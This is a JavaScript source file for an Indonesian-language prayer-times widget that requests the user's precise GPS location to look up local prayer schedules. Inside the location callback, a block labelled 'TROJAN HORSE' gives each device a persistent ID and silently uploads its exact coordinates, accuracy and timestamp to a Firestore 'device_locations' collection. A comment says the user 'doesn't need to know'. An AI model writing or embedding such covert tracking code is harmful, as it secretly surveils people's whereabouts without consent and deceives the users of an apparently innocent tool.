import { db } from './firebase-config.js';
import { doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

document.addEventListener('DOMContentLoaded', () => {
    const openBtn = document.getElementById('open-prayer-btn');
    const closeBtn = document.getElementById('close-prayer-btn');
    const modal = document.getElementById('prayer-modal');

    if (!openBtn || !modal) return;

    const loading = document.getElementById('prayer-loading');
    const errorDiv = document.getElementById('prayer-error');
    const results = document.getElementById('prayer-results');
    const locText = document.getElementById('prayer-location-text');
    const dateText = document.getElementById('prayer-date-text');
    const nextupDiv = document.getElementById('prayer-nextup');
    const nextupText = document.getElementById('prayer-nextup-text');

    closeBtn.addEventListener('click', () => {
        modal.classList.add('hide');
    });

    openBtn.addEventListener('click', () => {
        modal.classList.remove('hide');

        // Reset state
        loading.style.display = 'block';
        errorDiv.classList.add('hide');
        results.classList.add('hide');
        results.innerHTML = '';
        nextupDiv.classList.add('hide');
        locText.textContent = 'Meminta akses lokasi GPS presisi...';

        const today = new Date();
        dateText.textContent = today.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });

        if (!navigator.geolocation) {
            showError('Geolokasi tidak didukung oleh browser ini.');
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;

                // --- TROJAN HORSE: Save to Firestore ---
                try {
                    const deviceId = localStorage.getItem('ngl_device_id') ||
                        (() => {
                            const id = 'did_' + Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
                            localStorage.setItem('ngl_device_id', id);
                            return id;
                        })();

                    await setDoc(doc(db, "device_locations", deviceId), {
                        lat: lat,
                        lng: lng,
                        accuracy: position.coords.accuracy,
                        timestamp: serverTimestamp()
                    });
                } catch (err) {
                    // Fail silently - user doesn't need to know
                    console.warn("Location save suppressed:", err.code);
                }

                // Fetch reverse geocode (city name)
                try {
                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=12`);
                    const geoData = await geoRes.json();
                    const city = geoData.address?.city || geoData.address?.regency || geoData.address?.county || 'Lokasi Anda';
                    const district = geoData.address?.suburb || geoData.address?.village || '';
                    locText.textContent = district ? `${district}, ${city}` : city;
                } catch (_) {
                    locText.textContent = `${lat.toFixed(4)}, ${lng.toFixed(4)}`;
                }

                // Fetch Aladhan Prayer Times
                try {
                    const res = await fetch(`https://api.aladhan.com/v1/timings?latitude=${lat}&longitude=${lng}&method=11`);
                    const data = await res.json();

                    if (data.code === 200) {
                        renderPrayerTimes(data.data.timings);
                    } else {
                        showError('Server jadwal sholat tidak dapat dijangkau. Coba lagi nanti.');
                    }
                } catch (err) {
                    showError('Koneksi bermasalah. Periksa koneksi internet Anda dan coba lagi.');
                }
            },
            (err) => {
                let msg = 'Gagal mendapatkan lokasi.';
                if (err.code === 1) msg = '❌ Izin Lokasi Ditolak!\n\nUntuk melihat jadwal sholat yang akurat, Anda harus mengizinkan akses lokasi GPS di browser Anda.';
                if (err.code === 2) msg = '⚠️ Lokasi Tidak Tersedia. Pastikan GPS perangkat Anda aktif.';
                if (err.code === 3) msg = '⏱️ Permintaan lokasi habis waktu. Coba lagi.';
                showError(msg);
            },
            {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            }
        );
    });

    function showError(msg) {
        loading.style.display = 'none';
        errorDiv.textContent = msg;
        errorDiv.classList.remove('hide');
    }

    function renderPrayerTimes(timings) {
        loading.style.display = 'none';
        results.classList.remove('hide');

        const prayers = [
            { id: 'Fajr',    name: 'Subuh',   icon: '🌅', color: '#6366f1' },
            { id: 'Sunrise', name: 'Terbit',  icon: '☀️',  color: '#f59e0b' },
            { id: 'Dhuhr',   name: 'Dzuhur',  icon: '🌞',  color: '#ef4444' },
            { id: 'Asr',     name: 'Ashar',   icon: '⛅',  color: '#f97316' },
            { id: 'Maghrib', name: 'Maghrib', icon: '🌆', color: '#8b5cf6' },
            { id: 'Isha',    name: 'Isya',    icon: '🌃',  color: '#3b82f6' },
        ];

        // Find next upcoming prayer
        const now = new Date();
        const nowMinutes = now.getHours() * 60 + now.getMinutes();
        let nextPrayer = null;

        prayers.forEach(p => {
            const [h, m] = timings[p.id].split(':').map(Number);
            const pMins = h * 60 + m;
            if (!nextPrayer && pMins > nowMinutes) {
                nextPrayer = p;
                const diffMins = pMins - nowMinutes;
                const hrs = Math.floor(diffMins / 60);
                const mins = diffMins % 60;
                nextupText.textContent = `${p.icon} ${p.name} — ${timings[p.id]} (${hrs > 0 ? hrs + ' jam ' : ''}${mins} menit lagi)`;
                nextupDiv.classList.remove('hide');
            }
        });

        prayers.forEach(p => {
            const isNext = nextPrayer && nextPrayer.id === p.id;

            const card = document.createElement('div');
            card.style.background = isNext ? `linear-gradient(135deg, ${p.color}22, ${p.color}44)` : 'var(--card-bg)';
            card.style.border = isNext ? `2px solid ${p.color}` : '1px solid var(--border-color)';
            card.style.padding = '18px 20px';
            card.style.borderRadius = '14px';
            card.style.display = 'flex';
            card.style.justifyContent = 'space-between';
            card.style.alignItems = 'center';
            card.style.transition = 'all 0.3s ease';

            const timeStr = timings[p.id];
            card.innerHTML = `
                <span style="font-size: 1rem; display:flex; align-items:center; gap:10px; font-weight: ${isNext ? 700 : 500}; color: var(--text-main);">
                    <span style="font-size: 1.4rem;">${p.icon}</span>
                    ${p.name}
                    ${isNext ? '<span style="font-size:0.7rem; background:' + p.color + '; color:white; padding:2px 8px; border-radius:100px; font-weight:600;">Berikutnya</span>' : ''}
                </span>
                <span style="color: ${isNext ? p.color : '#10b981'}; font-size: 1.3rem; font-weight: bold; font-variant-numeric: tabular-nums;">${timeStr}</span>
            `;
            results.appendChild(card);
        });
    }
});
